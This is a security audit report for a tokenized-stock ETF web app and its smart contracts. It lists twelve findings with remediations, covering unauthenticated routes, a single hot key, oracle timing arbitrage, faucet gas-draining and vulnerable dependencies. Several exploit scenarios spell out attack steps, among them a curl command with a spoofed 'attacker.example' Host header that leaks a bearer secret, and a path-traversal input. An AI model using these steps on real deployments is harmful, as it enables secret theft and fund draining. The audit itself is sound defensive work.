## Findings

### [HIGH] F-01: `/api/flow/rebalance` lets anyone call a secret-protected action

**Confidence:** 9/10 · **Category:** OWASP A01 Broken Access Control / STRIDE E · **Location:** `src/app/api/flow/rebalance/route.ts:8-16`

**Description:** The route has no auth check of its own. It reads `STOCK_AGENT_SECRET` and makes a server-side POST to `/api/stocks/agent` with `Authorization: Bearer <secret>` and `action: 'rebalance'`. The bearer check on the agent route therefore does nothing for this path. The target URL is built from `request.url`. When self-hosting (`next start` behind a proxy that passes `Host`/`X-Forwarded-Host` through), an attacker-chosen host can make the server send the bearer secret to an attacker's server. On Vercel, routing by host limits that second part, which is not verified.

**Exploit scenario:**
1. `curl -X POST https://<app>/api/flow/rebalance` with no credentials.
2. The server pushes all 415 prices on-chain and calls `vault.rebalance()`. Both are paid from the deployer key.
3. A loop of this drains the deployer's ETH and fights with the cron over nonces.
4. (Self-hosted) `curl -H 'Host: attacker.example' ...`: the server POSTs the secret to `attacker.example/api/stocks/agent`. The attacker now holds the secret for `set-weights`.

**Remediation:** Remove the route, or make it require the same bearer check. Never forward the secret. Call the shared function directly instead of making an HTTP request to itself:
```ts
// lib/stock-agent.ts: export syncPrices() and rebalance(); import them in both routes
if (req.headers.get('authorization') !== `Bearer ${secret}`) return new Response(null, { status: 401 });
```
Compare the bearer in constant time (`crypto.timingSafeEqual`).

**Priority:** P0

### [HIGH] F-02: One hot key in the web server controls the whole protocol

**Confidence:** 9/10 · **Category:** STRIDE E / Infrastructure / A04 · **Location:** `src/lib/stock-vault.ts:50-55`, `scripts/deploy-base-sepolia.mjs:56-57,121-126,136,148,209`, `src/config/deployments/base-sepolia.json`

**Description:** `getStockAgentSigner()` falls back to `DEPLOYER_PRIVATE_KEY`, and `.env.local` sets no separate `STOCK_AGENT_PRIVATE_KEY`. The deployment file shows `deployer == agentWallet == treasury == 0x732E…ec55`. That one key, loaded into every serverless function:
- owns `StockExchange`. `registerVault(anyAddress)` lets that address call `mint()` for any amount of tUSDC or any stock
- owns `ETFFactory` and is the guardian (pause or unpause) of every user ETF
- is `initialAdmin` and holds `MINT_ROLE`/`BURN_ROLE` on tUSDC and all 415 stock tokens
- is the authorized price agent (`setPrices` has no bounds)
- is the treasury and the manager of the flagship ETF

**Exploit scenario:** Any server-side leak puts all of it at risk: a vulnerable dependency (see F-09), a leaked Vercel env, a log line, or an SSRF that exposes env. The attacker can set any price, mint any amount, and redeem every ETF's holders' value.

**Remediation:** Split the roles:
- owner/admin → a multisig or a cold key that is never in the web env
- price agent → a key that can call only `setPrices`
- faucet minter → a separate key with `MINT_ROLE` on test tokens only, never exchange ownership
- treasury → a separate address

Set `STOCK_AGENT_PRIVATE_KEY` and remove `DEPLOYER_PRIVATE_KEY` from Vercel. This is required before mainnet.

**Priority:** P0 (mainnet blocker; P1 while testnet-only)

### [HIGH] F-03: Attacker can choose when the oracle updates, enabling risk-free arbitrage

**Confidence:** 8/10 · **Category:** A06 Insecure Design / STRIDE T · **Location:** `src/app/api/stocks/agent/route.ts:8-10,40,66-71`; `contracts/StockExchange.sol:33,100-108`; `contracts/StockBasketVault.sol:289-360`

**Description:** Vaults mint and burn at the pushed price, and the exchange has unlimited liquidity. Off-chain prices (Coinbase NAV / Yahoo) are public and move all day. On-chain prices update only at the cron or when someone calls the open `sync-prices` action, and `maxPriceAge` is 7 days. Anyone can therefore see the gap between the real and on-chain price, buy at the stale price, trigger the update themselves, and sell at the new price. `lastSync` is set only after the txs confirm, and it is stored per instance. Concurrent requests all pass the 2-minute check.

**Exploit scenario:**
1. Attacker calls `ETFFactory.createETF` with 100% of a stock whose real price is above the on-chain price, and fees of 0.
2. Faucet tUSDC, then `deposit(tUSDC)`. Shares are priced at the stale price.
3. `POST /api/stocks/agent {"action":"sync-prices"}`. The oracle jumps to the real price.
4. `withdraw(shares, tUSDC, 0)`. More tUSDC is minted than was put in. Repeat with any number of addresses.

**Remediation:** Make `sync-prices` auth-only. Cut `maxPriceAge` to minutes during market hours. Add a deposit/withdraw delay (a two-step request/claim, or one-block-later pricing) or a spread or fee on cash mint/burn. Store the sync lock in shared storage (KV/Redis), not module memory, and take it before sending txs.

**Priority:** P1

### [MEDIUM] F-04: Faucet and price sync can be abused to drain the deployer's gas and collide nonces

**Confidence:** 8/10 · **Category:** A06 / STRIDE D · **Location:** `src/app/api/stocks/faucet/route.ts:12,24-35`; `src/app/api/stocks/agent/route.ts:33`

**Description:** The cooldown is an in-memory `Map` keyed by address. New addresses cost nothing to make, and every serverless instance has its own map. Each claim sends 1–2 txs from the deployer. The faucet, sync, and rebalance paths all use `getNonce('pending')` on the same key with no shared lock, so concurrent requests collide on nonces and the cron's price pushes fail.

**Exploit scenario:** A script POSTs `{address: randomAddress()}` in a loop. The deployer's Base Sepolia ETH runs out, and price syncs and rebalances stop.

**Remediation:** Rate-limit by IP and add a CAPTCHA or proof of wallet ownership (a signed message). Keep cooldowns in shared storage. Queue all writes for this key through one nonce manager or job queue. Set a balance floor alert.

**Priority:** P1

### [MEDIUM] F-05: Vault deposit has no minimum-shares check and is open to share inflation

**Confidence:** 6/10 · **Category:** A06 / smart contract · **Location:** `contracts/StockBasketVault.sol:289-315`

**Description:** For the first deposit, shares are 1:1 with USD. After that, `getTotalValue()` reads raw `balanceOf`, so tokens sent directly to the vault raise the NAV. An attacker can deposit 1 wei of value and then send stock directly to the vault. Later depositors' shares round down. Deposits that would round to 0 shares revert, but values in between lose up to about 50% to the attacker. `deposit` also has no `minSharesOut`, so price moves between submit and execution can't be bounded.

**Remediation:** Add a `minSharesOut` parameter. Use virtual shares/assets (OpenZeppelin ERC4626 offset pattern) or mint dead shares on the first deposit. Use tracked `assetInfo.balance` instead of `balanceOf` for NAV.

**Priority:** P2

### [MEDIUM] F-06: No sanity bounds on oracle input, and the market data comes from an unofficial endpoint

**Confidence:** 7/10 · **Category:** A08 Data Integrity / STRIDE T · **Location:** `contracts/StockExchange.sol:100-108`; `src/lib/stock-prices-core.mjs:7,43,77-78`

**Description:** `setPrices` accepts any non-zero price for any address, listed or not, with no limit on how far it can move. Off-chain, prices without a NAV come from `query1.finance.yahoo.com/v7/finance/spark` with a spoofed `User-Agent: Mozilla/5.0`. That endpoint is undocumented and can change, throttle, or return wrong values. Those values are pushed on-chain as-is. A bad tick (wrong currency, split, multiplier mismatch) becomes a mint and redeem price.

**Remediation:** On-chain, cap the per-update change (for example ±20% unless the owner overrides) and require `isListed`. Off-chain, reject outliers against the last on-chain price and against CMC. Prefer an official or keyed feed.

**Priority:** P2

### [MEDIUM] F-07: Unauthenticated proxy burns CoinMarketCap credits

**Confidence:** 7/10 · **Category:** A06 / STRIDE D · **Location:** `src/app/api/market/route.ts:9-22`

**Description:** `symbols` (up to 100) and `limit` (1–500) come from the caller. Next's fetch cache is keyed by URL, so every new combination is a fresh paid CMC call. A loop over permutations uses up the plan's monthly credits, and `/api/stocks` falls back to no market data.

**Remediation:** Only allow a fixed list of symbols or limits. Add per-IP rate limits. Cache by normalized (sorted, deduplicated) params. Set a CMC usage alert.

**Priority:** P2

### [MEDIUM] F-08: No security headers or CSP on a wallet dApp, and type errors are ignored at build

**Confidence:** 6/10 · **Category:** A02 Security Misconfiguration · **Location:** `next.config.js` (no `headers()`), no `src/middleware.ts`; `next.config.js:16-22`

**Description:** There is no CSP, `X-Frame-Options`/`frame-ancestors`, HSTS, `Referrer-Policy`, or `Permissions-Policy`. A page that asks users to sign transactions can be framed for clickjacking. Any injected script runs with no CSP to stop it. `typescript.ignoreBuildErrors` and `eslint.ignoreDuringBuilds` let type-unsafe code ship.

**Remediation:** Add `async headers()` with `frame-ancestors 'none'` and a CSP allowing self plus the Reown/WalletConnect origins. Re-enable type checking in `build`.

**Priority:** P2

### [MEDIUM] F-09: Vulnerable dependencies, mostly unused

**Confidence:** 8/10 · **Category:** A03 Supply Chain · **Location:** `package.json`

**Description:** `npm audit --omit=dev`: **67 advisories (3 critical, 32 high, 14 moderate, 18 low)**. Most of the risk is in packages that are installed but **never imported** in `src/` or `scripts/`:

| Unused direct dep | Advisory |
|---|---|
| `@hpke/core`, `@hpke/chacha20poly1305` | **critical**: AEAD nonce reuse (GHSA-73g8-5h73-26h4) |
| `ai` | high: file-type allowlist bypass (GHSA-rwvc-j5jr-mgvh), plus jsondiffpatch XSS/prototype pollution |
| `openai` | high (fix in 7.x) |
| `@google/genai`, `@google/generative-ai` | high |
| `@blockscout/app-sdk`, `bs58`, `@noble/hashes` | moderate, plus attack surface |

Used packages with advisories: `next` (moderate, fixed in 16.4.6), `ethers` 6.x (moderate, update within 6.x), `@reown/appkit*` (high via transitive deps, no fix upstream yet), `moralis` (old ethers v5 / `elliptic` / `pbkdf2` / `sha.js` chain; `pbkdf2` and `sha.js` are critical).

Other: there is no CI to run audits. Two lockfiles (`bun.lock`, `package-lock.json`) can drift apart. Install scripts run for `@reown/appkit`, `keccak`, `secp256k1`, `@tailwindcss/oxide`, `unrs-resolver`.

**Remediation:**
```bash
npm rm ai openai @google/genai @google/generative-ai @hpke/core @hpke/chacha20poly1305 @blockscout/app-sdk bs58 @noble/hashes
npm i ethers@^6 next@15 # latest 15.x patch; evaluate 16.x separately
```
Decide whether Moralis is still needed (`MoralisProvider` etc.). Removing it clears most of the low/critical transitive chain. Keep one lockfile, and add a CI job running `npm audit --audit-level=high`.

**Priority:** P1 (removals are about 15 minutes of work)

### [LOW] F-10: Path traversal from `etfId` into `BACKEND_URL`

**Confidence:** 5/10 · **Category:** A01 / SSRF · **Location:** `src/app/api/[etfId]/portfolio/route.ts:15`

**Description:** `etfId` is put into `${BACKEND_URL}/api/etf/${etfId}/portfolio` without encoding. A decoded value like `../../admin?x=` gives a GET to any path on the backend host. Impact depends on what runs at `BACKEND_URL`. Nothing does on Vercel by default (localhost:8080). The route also returns made-up fallback balances with `success: true`.

**Remediation:** Validate `etfId` (`/^[a-z0-9-]{1,64}$/i`) and `encodeURIComponent` it, or delete the route if the backend is gone.

**Priority:** P3

### [LOW] F-11: Raw upstream error messages are returned to clients

**Confidence:** 7/10 · **Category:** A10 / STRIDE I · **Location:** `src/app/api/stocks/agent/route.ts:57,96`; `src/app/api/stocks/faucet/route.ts:49`; `src/app/api/market/route.ts:24`; `src/app/api/market/tokenized-stocks/route.ts:21`

**Description:** `e.message` from ethers or CMC goes straight into the response. ethers errors can include the RPC request URL. If `BASE_SEPOLIA_RPC_URL` is a keyed provider URL (Alchemy/QuickNode), the key can leak.

**Remediation:** Log the details server-side and return a generic message with a request id.

**Priority:** P3

### [LOW] F-12: Mock "verification" endpoints accept any wallet and claim on-chain records that don't exist

**Confidence:** 9/10 (that it happens) / low impact · **Category:** A07 / STRIDE S, R · **Location:** `src/app/api/verify-twitter/**`, `src/app/verify-twitter/bio/**` (duplicate copies), `src/lib/shared-storage.ts:105`, `src/app/verify/page.tsx:574`

**Description:** Mock mode is on unless `?mock=false` is passed. `alwaysSucceedInMockMode = true`. No wallet signature is required, so anyone can "verify" any address with any handle. The tweet check reads a hardcoded tweet. Bio codes come from `Math.random()` and are logged in full. Attestation tx hashes are random. The UI says the result was "recorded on the blockchain". Today nothing grants access based on `verified`, so the impact is user deception and impersonation in the UI, not escalation. If anything starts gating on it, this becomes HIGH. The same mock pattern is in `/api/flow/deposit|withdraw`, `POST /api/flow/agent`, and `/api/create`, which return `success: true` with fake tx hashes.

**Remediation:** Remove these routes or mark them clearly as demos. A real version needs a SIWE (EIP-4361) signature from the wallet, the X API v2 with OAuth2 PKCE (the state store is currently a separate `Map` per file, so the callback can never find the state), `crypto.randomInt` for codes, and persistent storage.

**Priority:** P3
